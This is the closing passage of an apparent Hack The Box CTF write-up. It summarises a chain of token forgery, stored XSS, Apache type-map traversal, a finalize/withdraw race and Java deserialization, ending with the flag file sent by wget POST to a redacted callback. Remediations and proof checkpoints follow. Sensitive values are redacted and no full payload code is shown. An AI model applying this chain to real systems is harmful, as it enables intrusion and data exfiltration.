+<p>The callback received a POST from <code>wget</code> containing <code>/flag.txt</code>:</p>
+
+<img src="/images/signetry/Screenshot 2026-07-28 at 1.22.50 AM copy.png" alt="Redacted callback showing flag receipt" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>HTB{REDACTED}</code></pre>
+
+<p>Taken together with the source ordering and the staged model's initial state, the <code>202</code>, <code>200</code>, and callback supported the race. The <code>202</code> showed that the Java registry validated and queued the model, while the callback proved that its worker restored and executed it. Because withdrawal returned <code>200</code> after any valid request body, that status was not standalone proof of deletion. The complete result strongly supported finalization retaining the blob while withdrawal changed the marker state.</p>
+
+<hr>
+
+<h2>What made the chain possible</h2>
+
+<p>Each stage crossed authority that should have remained separate:</p>
+
+<ul>
+<li>The reset service accepted attacker-signed tokens because its HMAC key was empty and the token selected the account.</li>
+<li>The appeal renderer preserved an inline event handler on a custom element.</li>
+<li>The Warden reviewed attacker-controlled markup with an authenticated service session.</li>
+<li>Apache parsed type maps from a writable public directory and allowed a relative variant to reach an internal application route.</li>
+<li>Model state was split across several Redis keys and changed without one atomic finalization decision.</li>
+<li>The Java registry deserialized attacker-controlled model data and permitted command execution during object restoration.</li>
+</ul>
+
+<p>The corresponding controls follow from the chain: require a nonempty high-entropy reset key, sanitize custom elements and event attributes, remove credential-reset authority from the review bot, disable content negotiation in writable directories, enforce internal authorization inside the application, make finalization atomic and digest-bound, and replace Java object deserialization with a data-only model format.</p>
+
+<hr>
+
+<h2>Proof of completion</h2>
+
+<p>The solve produced four independent checkpoints:</p>
+
+<ol>
+<li><code>/api/whoami</code> returned through an uploaded type map.</li>
+<li>The conservator account reported the <code>curator</code> role after Warden review.</li>
+<li>Java 11 validation reported <code>sink_executed=true</code>.</li>
+<li>The race returned <code>finalize=202</code> and <code>withdraw=200</code>, followed by the callback POST.</li>
+</ol>
+
+<p>The complete flag, credentials, session values, model token, target addresses, and callback identifier are redacted.</p>
+
+<hr>
+
+<h2>Attribution</h2>
+
+<p>I completed the source review, local reproductions, live requests, exploit construction, Java validation, race execution, and flag submission documented here. I have not attributed teammate work to myself.</p>
+
+<p>Hack The Box allowed AI as a supporting tool during the competition. I used it to help evaluate Apache content-negotiation variants, reason through Java gadget compatibility, refine the race harness, and edit my notes. I executed the commands, interpreted the evidence, and validated each exploit primitive against the supplied source or live target.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<ol>
+<li>Forged an empty-key reset token for <code>dms@htb.com</code>.</li>
+<li>Authenticated as the maintainer.</li>
+<li>Submitted a self-triggering stored appeal.</li>
+<li>Uploaded a two-stanza Apache type map.</li>
+<li>Resolved <code>../internal/dispatch</code> through an Apache subrequest.</li>
+<li>Queued the authenticated Warden.</li>
+<li>Reset <code>conservator@htb.com</code> through the stored appeal.</li>
+<li>Authenticated as the curator.</li>
+<li>Built a valid DL4J model containing <code>preprocessor.bin</code>.</li>
+<li>Verified the <code>BadAttributeValueExpException</code> to <code>POJONode</code> to <code>TemplatesImpl</code> chain under Java 11.</li>
+<li>Staged the model as the maintainer.</li>
+<li>Raced curator <code>/finalize</code> against maintainer <code>/withdraw</code>.</li>
+<li>Triggered deserialization inside the Java registry.</li>
+<li>Sent the flag file to the controlled callback.</li>
+</ol>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+<script>
+    (() => {
+        const menuToggle = document.getElementById("menu-toggle");
+        const menu = document.getElementById("menu");
+
+        if (!menuToggle || !menu) {
+            return;
+        }
+
+        document.documentElement.classList.add("js-menu-ready");
+
+        const closeMenu = (restoreFocus = false) => {
+            menuToggle.setAttribute("aria-expanded", "false");
+            menu.classList.remove("menu-open");
+
+            if (restoreFocus) {
+                menuToggle.focus();
+            }
+        };
+
+        menuToggle.addEventListener("click", () => {
+            const isOpen =
+                menuToggle.getAttribute("aria-expanded") === "true";
+
+            menuToggle.setAttribute(
+                "aria-expanded",
+                String(!isOpen)
+            );
+            menu.classList.toggle("menu-open", !isOpen);
+        });
+
+        menu.addEventListener("click", (event) => {
+            if (event.target.closest("a")) {
+                closeMenu();
+            }
+        });
+
+        document.addEventListener("click", (event) => {
+            const isOpen =
+                menuToggle.getAttribute("aria-expanded") === "true";
+
+            if (
+                isOpen &&
+                !menu.contains(event.target) &&
+                !menuToggle.contains(event.target)
+            ) {
+                closeMenu();
+            }
+        });
+
+        document.addEventListener("keydown", (event) => {
+            const isOpen =
+                menuToggle.getAttribute("aria-expanded") === "true";
+
+            if (event.key === "Escape" && isOpen) {
+                closeMenu(true);
+            }
+        });
+
+        const desktopQuery =
+            window.matchMedia("(min-width: 769px)");
+
+        desktopQuery.addEventListener("change", (event) => {
+            if (event.matches) {
+                closeMenu();
+            }
+        });
+    })();
+</script>
+</body>
+</html>
